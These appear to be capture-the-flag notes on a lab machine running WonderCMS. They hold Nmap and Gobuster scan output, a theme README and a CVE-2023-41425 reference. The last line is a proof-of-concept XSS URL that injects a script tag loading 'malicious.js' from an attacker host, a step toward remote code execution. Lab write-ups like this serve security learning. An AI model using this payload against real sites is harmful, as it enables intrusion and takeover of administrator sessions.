
Nmap Scan Result - 

```
$ sudo nmap -sCV -p- 10.129.34.215

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 12:50 +0100
Nmap scan report for 10.129.34.215
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.76 seconds
```

Gobuster Scan Result - 

```
$ gobuster dir -u http://10.129.34.215 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,js,txt

contact.php       (Status: 200) [Size: 2731]
data              (Status: 301) [Size: 234] [--> http://10.129.34.215/data/]
home              (Status: 200) [Size: 3680]
index.php         (Status: 200) [Size: 3680]
messages          (Status: 301) [Size: 238] [--> http://10.129.34.215/messages/]
plugins           (Status: 301) [Size: 237] [--> http://10.129.34.215/plugins/]
themes            (Status: 301) [Size: 236] [--> http://10.129.34.215/themes/]
```

"http://10.129.34.215/themes/bike/README.md" -
```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

WonderCMS 3.4.2 - Remote Code Execution (RCE) - 
- CVE-2023-41425


CVE: CVE-2023-41425 (POC) - 

http://10.129.34.215/index.php?page=loginURL?"></form><script+src="http://10.10.17.32:8888/malicious.js"></script><form+action="